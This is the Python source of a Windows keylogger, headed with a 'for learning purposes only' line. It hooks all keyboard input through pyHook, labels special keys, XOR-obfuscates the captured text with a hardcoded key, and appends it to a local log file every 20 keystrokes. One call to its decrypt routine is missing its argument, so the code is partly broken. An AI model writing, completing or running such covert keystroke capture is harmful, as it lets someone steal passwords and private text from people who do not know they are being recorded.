## Made by Gil Mansharov
## For learning porpuses only

import pyHook, pythoncom
import win32event, win32api, winerror
import threading
import os.path

def WriteToFile():
    save_path = "C:/Keylogger/"
    name_of_file = "KeyLogger"
    complete_name = os.path.join(save_path, name_of_file+".txt")
    file = open(complete_name, "a")
    file.write(xor(Pressed.i, Pressed.key))
    file.close()

def KeyFilters(event):
    if (event.KeyID is 13):
        Pressed.i += ' [Enter] '
    elif (event.KeyID is 162 or event.KeyID is 163):
        Pressed.i += ' [CTRL] '
    elif (event.KeyID is 164 or event.KeyID is 165):
        Pressed.i += ' [ALT] '
    elif (event.KeyID is 8):
        Pressed.i += ' [BackSpace] '
    elif (event.KeyID is 160 or event.KeyID is 161):
        Pressed.i += ' [SHIFT] '
    elif (event.KeyID is 46):
        Pressed.i += ' [Delete] '
    elif (event.KeyID is 32):
        Pressed.i += ' [Space] '
    elif (event.KeyID is 27):
        Pressed.i += ' [Escape] '
    elif (event.KeyID is 9):
        Pressed.i += ' [TAB] '
    elif (event.KeyID is 20):
        Pressed.i += ' [CapsLock] '
    elif (event.KeyID is 38):
        Pressed.i += ' [Up] '
    elif (event.KeyID is 40):
        Pressed.i += ' [Down] '
    elif (event.KeyID is 37):
        Pressed.i += ' [Left] '
    elif (event.KeyID is 91):
        Pressed.i += ' [Windows] '
    else:
        Pressed.i += chr(event.Ascii)
    Pressed.count += 1
    return True

def xor(data, key):
    output = ""
    for i, character in enumerate(data):
        output += chr(ord(character) ^ ord(key[i % len(key)]))
    return output 

def DecryptFile(complete_name):
    file = open(complete_name, "r")
    str = file.read()
    return (xor(str, Pressed.key))

class Pressed:
    i = ''
    count = 0
    key = "password"
    


def OnKeyboardEvent(event):
##    print 'MessageName:',event.MessageName
##    print 'Message:',event.Message
##    print 'Time:',event.Time
##    print 'Window:',event.Window
##    print 'WindowName:',event.WindowName
##    print 'Ascii:', event.Ascii, chr(event.Ascii)
##    print 'Key:', event.Key
##    print 'KeyID:', event.KeyID
##    print 'ScanCode:', event.ScanCode
##    print 'Extended:', event.Extended
##    print 'Injected:', event.Injected
##    print 'Alt', event.Alt
##    print 'Transition', event.Transition
##    print '---'
    KeyFilters(event)
    if (Pressed.count > 20):
        WriteToFile()
        DecryptFile()
        Pressed.count = 0
        Pressed.i = ''
    return True


hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
